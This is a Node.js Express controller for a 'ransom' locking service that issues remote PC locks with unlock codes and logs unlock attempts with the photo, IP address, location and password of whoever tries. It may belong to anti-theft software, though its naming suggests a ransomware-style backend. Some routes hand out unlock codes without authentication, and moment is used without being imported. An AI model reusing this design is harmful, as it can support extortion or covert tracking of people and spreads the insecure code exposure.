const Lock = require("../Models/lock.model");

exports.get_ransom_history = async (req, res) => {
  let ransom_unlock_history = {};
  const { key } = req.query;
  const search = await Lock.find({ key, media: { $ne: [] } }).sort(
    "-createdAt"
  );
  if (search) {
    let photo_links = [];
    let photos_dates = [];
    var fileNames = [];
    search.map((e, i) => {
      var filtered = search[i].media.filter(function (el) {
        return el != "";
      });
      filtered.forEach((e) => photo_links.push(e));
    });

    photo_links.forEach((e) => {
      fileNames.push(e.split("/")[4]);
    });
    fileNames.forEach((e) => {
      photos_dates.push(moment.unix(e.split("_")[3]).format("MMMM DD@hh:mm A"));
    });

    ransom_unlock_history.try_dates = photos_dates;
    ransom_unlock_history.photo = photo_links;
    ransom_unlock_history.last_try = moment(search.updatedAt).format(
      "MMMM DD@hh:mm A"
    );
  } else {
    ransom_unlock_history = null;
  }

  return res.status(200).json({ ransom_unlock_history });
};
exports.check_ransom_locker = async (req, res) => {
  let ransom_state = {};
  const { key } = req.query;
  const search = await Lock.findOne({ key, locked: true }).sort("-createdAt");
  if (search) {
    ransom_state.lock_date = moment(search.createdAt).format("MMMM DD@hh:mm A");
    ransom_state.locked = search.locked;
    ransom_state.unlock_code = search.code;
  } else {
    ransom_state = null;
  }
  return res.status(200).json({ ransom_state });
};

exports.un_lock_the_sky = async (req, res) => {
  try {
    const { key, code, location } = req.body;
    const find_code = await Lock.findOne({ key: key, locked: true });
    const code_saved = find_code.code;
    if (code_saved !== null && code_saved === code) {
      const new_lock_update = await Lock.findOneAndUpdate(
        { key: key, locked: true },
        { locked: false, unlock_pc_location: location },
        { new: true }
      );
      return res.json({ id: new_lock_update._id });
    }
    return res.sendStatus(401);
  } catch (error) {
    console.log(error);

    if (error) res.status(200).json({ status: "failed", error });
  }
};
exports.check_if_locked = async (req, res) => {
  try {
    const { key } = req.body;
    const find_lock_status = await Lock.findOne({ key, locked: true });
    if (find_lock_status)
      return res.status(200).json({
        status: "ok",
        locked: true,
        id: find_lock_status._id,
      });
    return res.status(200).json({
      status: "ok",
      locked: false,
    });
  } catch (e) {
    console.log(e);
  }
};
exports.createEmergencyLockerOrder = async (key, pc_id, order_id) => {
  const unlock_code_array = Math.random()
    .toString(20)
    .substr(2, 12)
    .match(/.{1,4}/g);

  let new_lock = await Lock.create({
    locked: true,
    key,
    code:
      unlock_code_array[0] +
      "-" +
      unlock_code_array[1] +
      "-" +
      unlock_code_array[2],
    order: order_id,
    pc: pc_id,
  });

  return new_lock._id;
};

exports.register_tries = async (req, res) => {
  try {
    const {
      key,
      lock_id,
      order_id,
      try_time,
      try_ip,
      try_location,
      try_password,
      image,
    } = req.body;

    const get_lock = await Lock.findOneAndUpdate(
      { order: order_id, key: key },
      {
        $push: {
          tries: {
            try_time,
            image,
            try_location,
            try_password,
            try_ip,
            g_id: lock_id,
          },
        },
      }
    );
    get_lock.tries_count = get_lock.tries.length + 1;
    get_lock.last_try = get_lock.tries[get_lock.tries.length - 1].try_time;
    get_lock.save();
    if (get_lock) return res.sendStatus(200);
    return res.sendStatus(500);
  } catch (e) {
    console.log(e);
    return res.sendStatus(500);
  }
};
